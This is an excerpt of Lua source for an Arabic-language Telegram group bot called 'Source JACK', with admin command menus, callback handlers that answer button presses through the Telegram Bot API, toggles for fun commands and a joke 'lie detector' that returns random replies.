 اختر الامر الذي تريدها .↑≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
ده من الازرار بلاسفل . ≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》 ](t.me/xx_Source_JACK)❳ 
]]
keyboard = {} 
...
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ 
 𖤛 اهلا بك عزيزي 🔊
 𖤛 اوامر مطور الاساسي 👨🏼‍✈️
•┉ • ┉ • ┉ 《𝚅𝙸𝙅𝘼𝘾𝙆 𓃠》 ┉ • ┉ • ┉•
 𖤛 تفعيل
 𖤛 تعطيل
 𖤛 مسح الاساسين
 𖤛 المنشئين الاساسين
 𖤛 رفع/تنزيل منشئ اساسي
 𖤛 رفع/تنزيل مطور اساسي 
 𖤛 مسح المطورين
 𖤛 المطورين
 𖤛 رفع | تنزيل مطور
•┉ • ┉ • ┉ 《𝚅𝙸𝙅𝘼𝘾𝙆 𓃠》 ┉ • ┉ • ┉•
...
•┉ • ┉ • ┉ 《𝚅𝙸𝙅𝘼𝘾𝙆 𓃠》 ┉ • ┉ • ┉•
 ...
 𖤛 اذاعه
 𖤛 اذاعه بالتوجيه
 𖤛 اذاعه بالتوجيه خاص
 𖤛 اذاعه بالتثبيت
•┉ • ┉ • ┉ 《𝚅𝙸𝙅𝘼𝘾𝙆 𓃠》 ┉ • ┉ • ┉•
 𖤛 جلب نسخه البوت
 𖤛 رفع نسخه البوت
 𖤛 ضع عدد الاعضاء + العدد
 𖤛 ضع كليشه المطور
 𖤛 تفعيل/تعطيل الاذاعه
 𖤛 تفعيل/تعطيل البوت الخدمي
 𖤛 تفعيل/تعطيل التواصل
 𖤛 تغير اسم البوت
 𖤛 اضف/مسح رد عام
 𖤛 الردود العامه
 𖤛 مسح الردود العامه
•┉ • ┉ • ┉ 《𝚅𝙸𝙅𝘼𝘾𝙆 𓃠》 ┉ • ┉ • ┉•
 𖤛 الاشتراك الاجباري
 𖤛 تعطيل الاشتراك الاجباري
 𖤛 تفعيل الاشتراك الاجباري
 𖤛 مسح رساله الاشتراك
 𖤛 تغير رساله الاشتراك
 𖤛 تغير الاشتراك
•┉ • ┉ • ┉ 《 𝚅𝙸𝙅𝘼𝘾𝙆 𓃠》 ┉ • ┉ • ┉•
 𖤛 الاحصائيات
 𖤛 المشتركين
 𖤛 المجموعات 
 𖤛 تفعيل/تعطيل المغادره
 𖤛 مسح الجروبات
•┉ • ┉ • ┉ 《𝚅𝙸𝙅𝘼𝘾𝙆 𓃠》 ┉ • ┉ • ┉•
...
local Teext =[[
 𖤛بك في مميزات سورس 𝙅𝘼𝘾𝙆 𓃠𖤛  
 𖤛مميزات الخاصه بسورس𖤛 
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
if Text == '/help30' then
local Text = 'لتجربه العلبه عليك ان تكتب البات في الشات𖤛💖'
...
if Text == '/help31' then
local Text = 'لتجربه العلبه عليك ان تكتب المختلف في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help32' then
local Text = 'لتجربه العلبه عليك ان تكتب التخمين في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help33' then
local Text = 'لتجربه العلبه عليك ان تكتب الاسرع في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help34' then
local Text = 'لتجربه العلبه عليك ان تكتب الحزوه في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help35' then
local Text = 'لتجربه العلبه عليك ان تكتب امثله في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help36' then
local Text = 'لتجربه العلبه عليك ان تكتب مريم في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help37' then
local Text = 'لتجربه العلبه عليك ان تكتب الرياضيات في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help38' then
local Text = 'لتجربه العلبه عليك ان تكتب السمايلات في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help39' then
local Text = 'لتجربه العلبه عليك ان تكتب العكس في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help40' then
local Text = 'لتجربه العلبه عليك ان تكتب الانكليزي في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help41' then
local Text = 'لتجربه العلبه عليك ان تكتب المعاني في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help42' then
local Text = 'لتجربه العلبه عليك ان تكتب عقاب في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help47' then
local Text = 'لتجربه العلبه عليك ان تكتب كشف الكذب في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
...
local Teext =[[
 𖤛مرحب  بك في مميزات سورس 𝙅𝘼𝘾𝙆 𓃠 𖤛
 𖤛 مميزات الخاصه بسورس 𖤛
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'تويت', callback_data="/help12"},{text = 'تويت بالصور', callback_data="/help56"}},   
...
if Text == '/help12' then
local Text = 'لتجربه العلبه عليك ان تكتب تويت في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help13' then
local Text = 'لتجربه العلبه عليك ان تكتب انصحني في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help14' then
local Text = 'لتجربه العلبه عليك ان تكتب الصراحه في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help15' then
local Text = 'لتجربه العلبه عليك ان تكتب رزله في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help16' then
local Text = 'لتجربه العلبه عليك ان تكتب بتكره دا في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help17' then
local Text = 'للاستماع للاغاني عليك ان تكتب غنيلي في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help18' then
local Text = 'لتجربه العلبه عليك ان تكتب نسبه جمالي في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help19' then
local Text = 'لتجربه العلبه عليك ان تكتب كتبات في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help20' then
local Text = 'لتجربه العلبه عليك ان تكتب لو خيروك في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help21' then
local Text = 'لتجربه العلبه عليك ان تكتب حروف في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help22' then
local Text = 'لتجربه العلبه عليك ان تكتب رد عليه يابوت في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help23' then
local Text = 'لتجربه العلبه عليك ان تكتب نكته في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help24' then
local Text = 'لتحميل من المواقع عليك ان تكتب اليتيوب في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help25' then
local Text = 'لتجربه العلبه عليك ان تكتب لو خيروك بالصور في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
if Text == '/help56' then
local Text = 'لتجربه العلبه عليك ان تكتب تويت بالصور في الشات𖤛💖'
https.request("https://api.telegram.org/bot"..token.."/answerCallbackQuery?callback_query_id="..data.id_.."&text="..URL.escape(Text).."&show_alert=true")
return false
end
--- callback added
if Text == '/add' then
local Teext =[[
🎮 اهلا بك في قسم الالعاب ..↑⟦𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛⟧
🕹 اختر العبه الذي تريدفي الاسفل ..↑⟦𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛⟧
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》 ](t.me/xx_Source_JACK)❳ 
]]
keyboard = {} 
...
send(msg.chat_id_, msg.id_,' 𖤛 تم مسح الامر')  
else
...
send(msg.chat_id_, msg.id_, ' 𖤛 تم تعطيل اوامر التسليه')
database:set(bot_id.."Fun_Bots:"..msg.chat_id_,"true")
end
if (text and text == "تفعيل اوامر التسليه") then 
send(msg.chat_id_, msg.id_, ' 𖤛  تم تفعيل اوامر التسليه')
database:del(bot_id.."Fun_Bots:"..msg.chat_id_)
end
local Name_Bot = (database:get(bot_id..'Name:Bot') or '𝙅𝘼𝘾𝙆 𓃠')
...
numj = {"اما قله ادب صحيح كلو كدب فى كدب💔😔"," ده مظبوط🙂😹"," اقلك الكلام ده كدب واللى قالولك كداب وانت كداب واللى بيتفرج كمان كداب🤝😂"," ده برجوله وموثق كمان❤️😁","فعلا بتتكلم صح🤗","يجدع قول كلام غير دا😹","احس هل شي كذب𖤛💕","طب عيني ف عينك كدا ??","انت صح",};
sendnuj = numj[math.random(#numj)]
xl = ' ⟨  '..text..'  ⟩ \n '..sendnuj..'.'
send(msg.chat_id_, msg.id_,xl) 
